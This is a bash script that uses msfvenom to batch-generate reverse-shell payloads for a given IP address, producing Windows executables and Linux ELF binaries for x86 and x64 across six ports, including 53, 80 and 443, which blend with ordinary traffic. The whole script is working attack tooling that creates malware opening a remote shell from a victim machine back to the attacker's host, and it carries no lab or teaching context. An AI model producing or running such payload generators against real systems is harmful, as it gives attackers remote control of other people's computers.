#!/bin/bash

# Error handling function
error_exit() {
    echo "$1" 1>&2
    exit 1
}

# Check if an IP address is provided
if [ -z "$1" ]; then
    error_exit "Usage: $0 <IP address>"
fi

IP=$1

# Validate IP address format
if ! [[ $IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    error_exit "Invalid IP address format."
fi

# Ports to generate payloads for
PORTS=(53 80 443 8080 4444 5555)

# Function to create Windows payloads
create_windows_payloads() {
    for port in "${PORTS[@]}"; do
        msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$port -f exe -a x86 --platform windows -o win_x86_$port.exe || error_exit "Failed to create Windows x86 payload on port $port"
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$port -f exe -a x64 --platform windows -o win_x64_$port.exe || error_exit "Failed to create Windows x64 payload on port $port"
    done
}

# Function to create Linux payloads
create_linux_payloads() {
    for port in "${PORTS[@]}"; do
        msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$port -f elf -a x86 --platform linux -o lin_x86_$port.elf || error_exit "Failed to create Linux x86 payload on port $port"
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$port -f elf -a x64 --platform linux -o lin_x64_$port.elf || error_exit "Failed to create Linux x64 payload on port $port"
    done
}

echo "Creating Windows payloads..."
create_windows_payloads

echo "Creating Linux payloads..."
create_linux_payloads

echo "Payloads created successfully."
